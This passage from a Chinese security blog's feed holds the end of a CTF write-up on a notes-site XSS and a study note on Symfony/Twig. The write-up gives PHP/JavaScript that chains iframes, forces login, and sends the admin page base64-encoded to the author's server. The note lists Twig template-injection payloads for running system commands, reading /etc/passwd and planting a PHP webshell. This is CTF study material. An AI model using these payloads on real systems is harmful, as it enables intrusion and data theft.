update</a></p><p>所以变得明显起来了</p><p>构造一个页面，嵌入一个<code>iframe</code>是admin的<code>profile</code>内容，包含了<code>flag</code></p><p>然后加载完这个<code>iframe</code>后再构造<code>iframe</code>退出登录</p><p>然后构造<code>iframe</code>登录到自己的帐号，里面有<code>xss</code></p><p>有一点是因为自己构造的页面和题目页面是跨域的，在自己页面无法访问那个<code>admin profile</code></p><p>所以<code>xss</code>就有用场了，<code>xss</code>页面和<code>admin profile</code>的<code>iframe</code>是同源的,</p><p>那么<code>iframe</code>之间获取内容</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一个注意的点-输出-等待-输出的方式"><a href="#一个注意的点-输出-等待-输出的方式" class="headerlink" title="一个注意的点 输出-等待-输出的方式"></a>一个注意的点 输出-等待-输出的方式</h3><p>因为题目打开浏览器浏览打开访问页面后立刻关闭</p><pre><code>    await page.goto(url)    await browser.close()</code></pre><p>在短时间内，可能无法执行完成<code>js</code>脚本</p><p>所以缓冲区输出然后<code>sleep(10)</code> 停几秒，让浏览器没那么快加载完资源</p><p>就可以执行<code>js</code>脚本了</p><pre><code>&lt;?phpecho 123333;ob_flush();flush();?&gt;&lt;?phpsleep(10);?&gt;</code></pre><p>这样</p><p>在我的 <code>vps</code>上面写两个页面</p><p>一个<code>cli.php</code> ,一个<code>10.php</code></p><p><code>cli.php</code>是<code>update_notes</code> 更改我的<code>xss</code>内容</p><p>而 <code>10.php</code> 就是交给admin去访问的</p><p>一些无用的内容多了一点，懒得删除了，<code>cli.php</code>掉入坑里了，烦</p><h3 id="10-php"><a href="#10-php" class="headerlink" title="10.php"></a>10.php</h3><pre><code>&lt;?phpheader('access-control-allow-origin:*');?&gt;&lt;html&gt;&lt;/html&gt;&lt;script&gt;    i=document.createElement("iframe");    i.src="https://notes.web.byteband.it/profile";    i.id="pwn";    i.name="pwn";    var state = 0;    document.body.appendChild(i);    i.onload=function () {        j=document.createElement("iframe");        j.src="https://notes.web.byteband.it/logout";        j.id="pwn2";        document.body.appendChild(j);        j.onload=function () {            k=document.createElement("iframe");            k.src="https://notes.web.byteband.it/login?username=mo0n&amp;password=mo0n";            k.id="pwn3";            document.body.appendChild(k);            k.onload=function () {                l=document.createElement("iframe");                l.src="http://47.92.94.199/cli.php";                l.id="pwn4";                document.body.appendChild(l);                l.onload=function () {                    m=document.createElement("iframe");                    m.src="https://notes.web.byteband.it/profile";                    m.id="pwn5";                    document.body.appendChild(m);                    console.log(i)                }            }        }    }&lt;/script&gt;&lt;?phpecho 123333;ob_flush();flush();?&gt;&lt;?phpsleep(10);?&gt;</code></pre><h3 id="cli-php"><a href="#cli-php" class="headerlink" title="cli.php"></a>cli.php</h3><p>这个的<code>js</code>内容就是卡住的地方，如果会<code>javascript</code>的话早就做出来了，吐了</p><p>搜索网上内容</p><p>给出的<code>兄弟iframe通信</code>得到的是<code>window.parent.document.getElementById("pwn")</code></p><p>这样的，但是这个是不行的，</p><p>在本地测试是无法获取这个<code>admin 的iframe</code>，得到是<code>null</code></p><p>一度怀疑</p><h4 id="可行的一个是"><a href="#可行的一个是" class="headerlink" title="可行的一个是"></a>可行的一个是</h4><pre><code>top.pwn.document.body.innerHTML这个pwn是 i.name="pwn"</code></pre><h4 id="一个注意的点"><a href="#一个注意的点" class="headerlink" title="一个注意的点"></a>一个注意的点</h4><p>随后因为获取<code>html</code>内容带有<code>&lt;</code> 这些，<code>chromium</code>浏览器禁止跳转</p><p>所以只要把它们变成<code>base64</code>就可以了</p><pre><code>&lt;?phpfile_put_contents('flagggggggggggggggggg','yes');echo 123;$js='try{var x = window.parent.document.getElementById("pwn");console.log(x);var right = (x.contentWindow || x.contentDocument);if(right.document){right = right.document;window.location="http://47.92.94.199/flag.php?good="+right;}}catch{console.log(123333);}';$js='try{var x= window.parent.document.getElementById("pwn5");console.log(12);}catch(err){console.log("false")}';$js='x=top.pwn.document.body.innerHTML;console.log(x);window.location="http://47.92.94.199/flag.php?good="+btoa(x);';$content="&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;{$js}/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;";$url='https://notes.web.byteband.it/update_notes';echo "&lt;form style='display:none;' id='form1' name='form1' method='post' action='{$url}'&gt;&lt;input name='notes' type='text' value='{$content}' /&gt;&lt;/form&gt;&lt;script type='text/javascript'&gt;function load_submit(){document.form1.submit()}load_submit();&lt;/script&gt;";$a=1;ob_flush();flush();?&gt;&lt;?phpsleep(60);?&gt;</code></pre><p><code>vps</code>接收数据，</p><p>然后只要把空格转换成<code>+</code> 号就可以了</p><p>base64解码</p><pre><code>echo 'CgkJCjxkaXYgY2xhc3M9Imhlcm8gaXMtZnVsbGhlaWdodCBpcy1jZW50ZXJlZCBpcy12Y2VudGVyZWQgaXMtcHJpbWFyeSI+Cgk8ZGl2IGNsYXNzPSJoZXJvLWhlYWQiPgoJCTxuYXYgY2xhc3M9Im5hdmJhciI+CgkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItYnJhbmQiPgoJCQkJCTxhIGhyZWY9Ii8iIGNsYXNzPSJuYXZiYXItaXRlbSI+CgkJCQkJCU15Tm90ZXMKCQkJCQk8L2E+CgkJCQk8L2Rpdj4KCQkJCTxkaXYgY2xhc3M9Im5hdmJhci1tZW51Ij4KCQkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItZW5kIj4KCQkJCQkJPHNwYW4gY2xhc3M9Im5hdmJhci1pdGVtIj4KCQkJCQkJCTxhIGhyZWY9Ii9sb2dvdXQiIGNsYXNzPSJidXR0b24gaXMtcHJpbWFyeSBpcy1pbnZlcnRlZCI+CgkJCQkJCQkJPHNwYW4+TG9nb3V0PC9zcGFuPgoJCQkJCQkJPC9hPgoJCQkJCQk8L3NwYW4+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9uYXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9Imhlcm8tYm9keSBjb2x1bW5zIGlzLWNlbnRlcmVkIGhhcy10ZXh0LWNlbnRlcmVkIj4KCQk8ZGl2IGNsYXNzPSJjb2x1bW4gaXMtNCI+CgkJCTxkaXYgY2xhc3M9InRpdGxlIj4KCQkJCUhvd2R5IGFkbWluIQoJCQk8L2Rpdj4KCQkJPCEtLSBzbyB0aGF0IHVzZXIgY2FuIHdyaXRlIGh0bWwgLS0+CgkJCTxwPglmbGFne2NoNDFuX3RIeV8zWHBsb2l0c190MF93MW59IDwvcD4KCQkJPGJyPgoJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iL3VwZGF0ZV9ub3RlcyI+CgkJCQk8dGV4dGFyZWEgY2xhc3M9InRleHRhcmVhIiBuYW1lPSJub3RlcyIgcGxhY2Vob2xkZXI9IldyaXRlIHNvbWV0aGluZyBoZXJlIj48L3RleHRhcmVhPgoJCQkJPGlucHV0IGNsYXNzPSJidXR0b24gaXMtZnVsbHdpZHRoIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGRhdGUiIG5hbWU9IiI+CgkJCTwvZm9ybT4KCQk8L2Rpdj4KCTwvZGl2Pgo8L2Rpdj4KCgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogIDxkaXYgY2xhc3M9ImNvbnRlbnQgaGFzLXRleHQtY2VudGVyZWQiPgogICAgPHA+CiAgICAgIDxzdHJvbmc+TXlOb3Rlczwvc3Ryb25nPiBieSBuMG9iLgogICAgPC9wPgogIDwvZGl2Pgo8L2Zvb3Rlcj4KCg=='|base64 -d</code></pre><p>看到<code>&lt;p&gt;    flag{ch41n_tHy_3Xploits_t0_w1n} &lt;/p&gt;</code></p><p><strong>flag:</strong></p><p>flag{ch41n_tHy_3Xploits_t0_w1n}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备忘录</title>
      <link href="/2020/04/09/bei-wang/"/>
      <url>/2020/04/09/bei-wang/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0d1ff2b5d744471b42044afa0557737d07c0b7f03bc2874e864815e9344e7db3"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Symfony和模板注入的简单学习</title>
      <link href="/2020/04/01/symfony/"/>
      <url>/2020/04/01/symfony/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Symfony"><a href="#Symfony" class="headerlink" title="Symfony"></a>Symfony</h2><p>安装</p><pre><code>wget https://get.symfony.com/cli/installer bash installer</code></pre><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>使用<code>composer</code></p><pre><code>composer create-project symfony/website-skeleton projectname</code></pre><p>感觉还是直接<code>symfony</code>来的方便一点</p><pre><code>symfony new --full project</code></pre><h3 id="检查安全漏洞"><a href="#检查安全漏洞" class="headerlink" title="检查安全漏洞"></a>检查安全漏洞</h3><pre><code>symfony check:security</code></pre><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>好像有坑，需要非<code>root</code>用户运行，还有一系列权限</p><pre><code>symfony server:start</code></pre><h3 id="创建Controller"><a href="#创建Controller" class="headerlink" title="创建Controller"></a>创建Controller</h3><pre><code>php bin/console make:controller HomeController</code></pre><p>有一个注释路由</p><p>安装</p><pre><code>composer require annotations</code></pre><p>如果是用 <code>symfony new --full project</code>就已经安装了</p><p>用法：</p><pre><code>class MainController extends AbstractController{    /**     * @Route("/subscribe", name="subscribe")     */ public function subscribe(){}}</code></pre><h3 id="查看路由"><a href="#查看路由" class="headerlink" title="查看路由"></a>查看路由</h3><pre><code> php bin/console debug:router</code></pre><h2 id="symfony-App-全局变量"><a href="#symfony-App-全局变量" class="headerlink" title="symfony App 全局变量"></a>symfony App 全局变量</h2><p>app全局变量会自动注入全部<code>twig</code>模板</p><h3 id="app-user"><a href="#app-user" class="headerlink" title="app.user"></a>app.user</h3><p>当前用户的对象</p><h3 id="app-request"><a href="#app-request" class="headerlink" title="app.request"></a>app.request</h3><p>当前的请求数据</p><p>所有的方法直接去源代码看</p><p><a href="https://github.com/symfony/symfony/blob/5.0/src/Symfony/Component/HttpFoundation/Request.php" target="_blank" rel="noopener">https://github.com/symfony/symfony/blob/5.0/src/Symfony/Component/HttpFoundation/Request.php</a></p><p>列举几个常用的方法</p><ul><li>app.request.get(key)</li></ul><p>获取<code>post</code>的变量</p><ul><li>getSession</li></ul><p>获取session</p><pre><code>{{ app.request.getSession()|join('')}}</code></pre><ul><li>app.request.getUser()</li></ul><p>获取用户</p><ul><li>app.request.getPassword()</li></ul><p>获取<code>header</code>头<code>PHP_AUTH_PW</code>身份验证密码</p><h3 id="app-session"><a href="#app-session" class="headerlink" title="app.session"></a>app.session</h3><p>关于session </p><p>几个方法</p><ul><li>app.session.all</li></ul><p>获取全部</p><ul><li><p>app.session.get</p><pre><code>app.session.get('xxx')</code></pre></li><li><p>app.session.set</p></li></ul><p>设置session</p><pre><code>app.session.set('key','value')</code></pre><h3 id="app-environment"><a href="#app-environment" class="headerlink" title="app.environment"></a>app.environment</h3><p>配置环境</p><h3 id="app-debug"><a href="#app-debug" class="headerlink" title="app.debug"></a>app.debug</h3><p>如果开启了 debug，就是true</p><h3 id="app-token"><a href="#app-token" class="headerlink" title="app.token"></a>app.token</h3><p>暂时略</p><h2 id="关于-app-request-的进一步学习"><a href="#关于-app-request-的进一步学习" class="headerlink" title="关于 app.request 的进一步学习"></a>关于 app.request 的进一步学习</h2><p><strong>想到看这个还是因为打比赛后看writeup，一个师傅想到模板渲染用文件上传来写任意文件这样骚姿势</strong></p><p>于是就也想看看，感觉没啥新的发现，<code>wtcl</code></p><p>最简单的还是查看代码</p><p>在<code>vendor/symfony/http-foundation/Request.php</code></p><p><img src="../../../../../../../images/symfony/app-request.png" alt="pic"></p><p>一个一个跟进</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p>是<code>POST</code>请求的内容</p><p>有</p><ul><li>all()</li><li>keys()</li><li>replace()</li><li>add()</li><li>get()</li><li>set()</li><li>has()</li><li>remove()</li><li>filter()</li></ul><h3 id="query-和request对应是GET"><a href="#query-和request对应是GET" class="headerlink" title="query 和request对应是GET"></a>query 和request对应是GET</h3><p>其中的方法和 <code>request</code>是一样的</p><pre><code>?a=11hh={{app.request.query.all()|join('')}}得到 1</code></pre><h3 id="attributes-和cookies方法都和这两个一样"><a href="#attributes-和cookies方法都和这两个一样" class="headerlink" title="attributes 和cookies方法都和这两个一样"></a>attributes 和cookies方法都和这两个一样</h3><ul><li><p>req.request.attributes</p></li><li><p>req.request.cookies</p></li></ul><h3 id="files"><a href="#files" class="headerlink" title="files"></a>files</h3><p><img src="../../../../../../../images/symfony/app-files.png" alt="pic"></p><p>可以看到 <code>FileBag extends ParameterBag</code></p><p>因此拥有上面一样的方法</p><p>同时上传的文件是<code>UploadedFile</code> 的实例</p><p>因此使用 <code>get</code>来获取上传的文件，可以使用<code>UploadFile</code>的方法</p><p>查看<code>UploadedFile.php</code> 的方法</p><p>没啥有用的感觉，应该就一个 <code>move</code> 可以任意文件上传吧</p><p><img src="../../../../../../../images/symfony/upload-move.png" alt="pic"></p><p>可以看到有两个参数，目录和名字</p><p>有写权限到任意位置</p><p>可以指定第二个参数为文件名，没有就是临时文件名</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>是环境变量的内容</p><p>看介绍：</p><p><strong>ServerBag is a container for HTTP headers from the $_SERVER variable.</strong></p><p>依然是 <code>extends ParameterBag</code></p><p>还是和上面类似，多了一个<code>getHeaders()</code></p><p>还是直接 <code>app.request.server.all()</code>简单粗暴</p><p>可以<code>set()</code>可以设置，但是没想到有什么用</p><h3 id="headers"><a href="#headers" class="headerlink" title="headers"></a>headers</h3><pre><code>app.request.headers </code></pre><p>这个看了下</p><h2 id="Twig-模板渲染简单学习"><a href="#Twig-模板渲染简单学习" class="headerlink" title="Twig 模板渲染简单学习"></a>Twig 模板渲染简单学习</h2><h3 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h3><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code>{% for i in 0..10%}1{%endfor%}</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code>{% if 1==1 %}1{%endif%}</code></pre><h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><pre><code>{% include 'twigi/inc.twig' %}包含多个{% include ['1.html', '2.html'] %}</code></pre><p>如果有字数限制应该可以考虑<code>include</code></p><p>只能是 <code>templates</code>目录下的</p><h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>启动熟悉的<code>sandbox</code>模式</p><pre><code>{% sandbox %}{% include '1.html' %}{% endsandbox %}</code></pre><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><pre><code>{% set foo = 'bar' %}</code></pre><h3 id="filter-重要的来了"><a href="#filter-重要的来了" class="headerlink" title="filter 重要的来了"></a>filter 重要的来了</h3><h4 id="convert-encoding"><a href="#convert-encoding" class="headerlink" title="convert_encoding"></a>convert_encoding</h4><p>从编码字符串转换到另外一种编码</p><pre><code>{{ 'a<sddsa>'|convert_encoding('UTF-8', 'utf-16be') }}</sddsa></code></pre><h4 id="escape转义"><a href="#escape转义" class="headerlink" title="escape转义"></a>escape转义</h4><pre><code>{{'da"'|escape}}</code></pre><p>为了方便用<code>e</code>作为别名</p><p>可以<code>escape</code>多种格式</p><ul><li><p>html默认</p><pre><code>{{'da"'|e('html')}} da&amp;quot; </code></pre></li><li><p>js</p><pre><code>{{'da"'|e('js')}}da\u0022 </code></pre></li><li><p>css</p></li></ul><pre><code>{{'da"'|e('css')}}da\22 </code></pre><ul><li>url</li></ul><pre><code>{{'da"'|e('url')}}da%22 </code></pre><ul><li>还有个html_attr</li></ul><p>转义HTML属性字符串</p><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>选择元素</p><pre><code>{{[1,2,3,4,5,6,7]|filter(i=&gt;i&gt;2)|join('')}}3,4,5,6,7 </code></pre><p>这个也可以传入 <code>function</code> ，也是可以函数执行 getshell的</p><h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>返回第一个数组，<code>{}</code>,字符串 的内容</p><pre><code>{{ [1, 2, 3, 4]|first }} \\1{{ { a: 1, b: 2, c: 3, d: 4 }|first }} \\1{{ '1234'|first }} \\1</code></pre><h4 id="last-和first对应"><a href="#last-和first对应" class="headerlink" title="last 和first对应"></a>last 和first对应</h4><h4 id="format-占位符号"><a href="#format-占位符号" class="headerlink" title="format 占位符号"></a>format 占位符号</h4><pre><code>{{'南梦师傅 %s'|format('tql')}}南梦师傅 tql </code></pre><h4 id="join-拼接成字符串"><a href="#join-拼接成字符串" class="headerlink" title="join 拼接成字符串"></a>join 拼接成字符串</h4><pre><code>{{ [1, 2, 3]|join }}123</code></pre><h4 id="json-encode-就是使用这个函数"><a href="#json-encode-就是使用这个函数" class="headerlink" title="json_encode 就是使用这个函数"></a>json_encode 就是使用这个函数</h4><pre><code>{{ {a:1}|json_encode()}}{&amp;quot;a&amp;quot;:1}{{ 123|json_encode()}}123 </code></pre><h4 id="keys-获取数组的键名"><a href="#keys-获取数组的键名" class="headerlink" title="keys 获取数组的键名"></a>keys 获取数组的键名</h4><pre><code>{{ {a:1,b:2,c:3}|keys|join(',') }}a,b,c{{ [1,2,3,4]|keys|join(',') }}0,1,2,3</code></pre><h4 id="length"><a href="#length" class="headerlink" title="length"></a>length</h4><pre><code>{{ 'das'|length}} //3</code></pre><h4 id="lower-和-upper"><a href="#lower-和-upper" class="headerlink" title="lower 和 upper"></a>lower 和 upper</h4><pre><code>{{ 'das'|lower}}{{ 'das'|upper}}</code></pre><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>就是数组内的映射的筛选</p><pre><code>{{[{a:1,b:2},{a:3,b:4}]|map(i=&gt; "#{i.a}")|join('') }}</code></pre><p>得到 <code>13</code></p><p><code>"{i.a}"</code> 这个引号需要是 双引号</p><p>更有用的一点是，允许用户传一个<code>function</code></p><p>可以是 <code>system</code> ，<code>passthru</code>，<code>exec</code> ,<code>popen</code>,</p><p><code>shell_exec</code> ，<code>file_put_contents</code>等等</p><p>那样就可以任意函数执行了</p><h4 id="merge-和php的一样"><a href="#merge-和php的一样" class="headerlink" title="merge 和php的一样"></a>merge 和php的一样</h4><p>数组合并</p><pre><code>{{ [1,2]|merge([3,4])|join(',')}}1,2,3,4</code></pre><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><pre><code>{{"abcdef "|replace({'a':'first','e':'haha'})}}firstbcdhahaf </code></pre><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><pre><code>{{"abcdef "|reverse}}fedcba </code></pre><h4 id="slice-切片"><a href="#slice-切片" class="headerlink" title="slice 切片"></a>slice 切片</h4><pre><code>{{'123'|slice(1,2)}} //23{{'123'[1:2]}} //23</code></pre><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><pre><code>{{ '1,2,3'|split(',') }}</code></pre><h4 id="striptags-去除标签"><a href="#striptags-去除标签" class="headerlink" title="striptags 去除标签"></a>striptags 去除标签</h4><pre><code>{{'<asd>asd'|striptags}} //asd</asd></code></pre><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>略</p><h4 id="url-encode"><a href="#url-encode" class="headerlink" title="url_encode"></a>url_encode</h4><pre><code>{{'<asd>asd'|url_encode}}%3Casd%3Easd </asd></code></pre><h3 id="function"><a href="#function" class="headerlink" title="function"></a>function</h3><h4 id="attribute-访问object方法"><a href="#attribute-访问object方法" class="headerlink" title="attribute 访问object方法"></a>attribute 访问object方法</h4><p><strong>还可以设置第三个参数，传递的变量</strong></p><p>可以访问 <code>object</code>的属性</p><p><strong>获取http请求</strong></p><pre><code>{{attribute(app,'request')}}</code></pre><p>获取<code>session</code></p><pre><code>{{ attribute(app,'session')|join('')}}</code></pre><p>当前程序环境的名称</p><pre><code>{{ attribute(app,'environment')}} //dev</code></pre><p>还有其他的方法，只是举个例子</p><h4 id="include-1"><a href="#include-1" class="headerlink" title="include"></a>include</h4><p>包含模板渲染的内容</p><p>可以传递变量</p><pre><code>{{ include('template.html', {foo: 'bar'}) }}</code></pre><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p>就是python那个</p><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>twig 读取模板的内容 限定在 templates</p><pre><code>{{ source('twigi/index.html.twig')}}</code></pre><h2 id="twig-和symfony"><a href="#twig-和symfony" class="headerlink" title="twig 和symfony"></a>twig 和symfony</h2><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><pre><code>第一个是路由，可以模板渲染{{ render('twig2hhh') }}{{ render('twig2hhh', options = []) }}</code></pre><h3 id="csrf-token-生成csrf-token"><a href="#csrf-token-生成csrf-token" class="headerlink" title="csrf_token 生成csrf token"></a>csrf_token 生成csrf token</h3><pre><code>{{csrf_token('asd')}}</code></pre><h3 id="humanize-人好看的形式"><a href="#humanize-人好看的形式" class="headerlink" title="humanize 人好看的形式"></a>humanize 人好看的形式</h3><pre><code>{{'adas'|humanize}} // Adas</code></pre><h3 id="file-excerpt-读取文件"><a href="#file-excerpt-读取文件" class="headerlink" title="file_excerpt 读取文件"></a>file_excerpt 读取文件</h3><pre><code>{{ '/etc/passwd'|file_excerpt(1, -1) }}</code></pre><p>第一个参数是<code>line</code></p><p>第二个参数是在给定行数周围显示多少行</p><p><code>-1</code>代表全部</p><h3 id="format-file"><a href="#format-file" class="headerlink" title="format_file"></a>format_file</h3><p>这个很迷似乎生成一个标签，然后点击就<code>can not open</code></p><p>懒得管了，占个位，用到再说</p><h3 id="file-link"><a href="#file-link" class="headerlink" title="file_link"></a>file_link</h3><p>生成一个链接，还是<code>can not open</code> ，继续占个位置</p><pre><code>{{ '/tmp/111'|file_link(1) }}http://127.0.0.1:8000/_profiler/open?file=/tmp/111&amp;amp;line=1#line1 </code></pre><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>从这次比赛学到了，tqlll</p><h3 id="显示变量"><a href="#显示变量" class="headerlink" title="显示变量"></a>显示变量</h3><p> <code>var_dump</code></p><p>上下文完整变量：</p><pre><code>{{dump()}}</code></pre><p>app 所有变量，不就是上面那个嘛</p><pre><code>{{dump(app)}}</code></pre><p><strong>所有环境变量</strong></p><pre><code>{{app.request.server.all|join(',')}}</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>注入{{app.request.query.filter(0,0,1024,{'options':'system'})}}并且 GET ?0=cat /etc/passwd</code></pre><p>或者</p><p>这个我试过报错了</p><pre><code>{{['cat${IFS}/etc/passwd']|filter('system')}}</code></pre><p>因为是数组，所以报错，所以应该拼接</p><p><strong>所以正确的应该是</strong></p><pre><code>{{['cat${IFS}/etc/passwd']|filter('system')|join('')}}</code></pre><p>或者</p><pre><code>{{['id']|map('passthru')}}"@aaa.bbb</code></pre><p>或者</p><pre><code>{{["id", 0]|reduce("passthru")}}{{[0, 0]|reduce("system", "id")|join(",")}}</code></pre><p>或者</p><pre><code>{{["id"]|filter('system')}}</code></pre><pre><code>{{["id", 0]|sort("system")|join(",")}}</code></pre><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>仅仅 </p><pre><code>{{app.request.files.get(key}}</code></pre><p>得到的是 临时文件名字</p><p><strong>然后下面是文件写入</strong></p><p>需要使用 multipart 文件上传</p><p>这里的<code>key</code>指的是</p><p>文件上传的<code>field</code>名字 </p><pre><code>{{app.request.files.get(key).move(app.request.query.get(1))}}并且GET 文件目录?1=/tmp/000</code></pre><p>内容如下：</p><pre><code>POST /subscribe?1=/tmp/000 HTTP/1.1Host: 192.168.0.102:8000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.102:8000/subscribe?Content-Type: multipart/form-data; boundary=---------------------------80447652219106375571633636037Content-Length: 78Connection: closeCookie: remember-me=YWRtaW46MTU4NjQyMjc5NDEzMTo3ZDcxMzIyOGY5OTYxYWQxYzJjYmIwM2VjMWYzNTU0ZgUpgrade-Insecure-Requests: 1-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file1"; filename="1234"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="email""{{app.request.files.get('file').move(app.request.query.get(1))}}"@qq.com-----------------------------80447652219106375571633636037--</code></pre><p>文件目录可以的情况下如果没有 <code>/tmp/000</code>，就会创建文件夹</p><p>然后得到的是一个临时文件名</p><p><code>/tmp/000/phpdEjxsR</code></p><p>或者 另外一种</p><pre><code>{{{"<!--?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}</code--></code></pre><h3 id="任意文件读取"><code><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</code></h3><pre><code><code>{{'/etc/passwd'|file_excerpt(1,30)}}{{'/etc/passwd'|file_excerpt(0,-1)}}</code></code></pre><p><code>或者</code></p><code><pre><code>{{app.request.files.get('file').__construct('/etc/passwd','')}}{{app.request.files.get('file').openFile.fread(99)}}</code></pre><p>这两个需要在同一个请求连着一起用，就可以读取 <code>/etc/passwd</code>的内容了，读取<code>99</code>个字节</p><p>用到了 <code>app.request.files</code>的需要</p><p>multipart 的文件上传</p><p>以下成功了：</p><pre><code>POST /subscribe HTTP/1.1Host: 192.168.0.102:8000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.102:8000/subscribe?Content-Type: multipart/form-data; boundary=---------------------------80447652219106375571633636037Content-Length: 78Connection: closeCookie: remember-me=YWRtaW46MTU4NjQyMjc5NDEzMTo3ZDcxMzIyOGY5OTYxYWQxYzJjYmIwM2VjMWYzNTU0ZgUpgrade-Insecure-Requests: 1-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1234"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037</code></pre><p>参考:</p><p><a href="https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md" target="_blank" rel="noopener">https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md</a></p><p><a href="https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel" target="_blank" rel="noopener">https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel</a></p><p><a href="https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html" target="_blank" rel="noopener">https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html</a></p><p><a href="https://twig.symfony.com/doc/3.x/templates.html" target="_blank" rel="noopener">https://twig.symfony.com/doc/3.x/templates.html</a></p></code><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Symfony </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>firefox中content-type的XSS</title>
      <link href="/2020/03/31/firefox-content-type-xss/"/>
      <url>/2020/03/31/firefox-content-type-xss/</url>
      
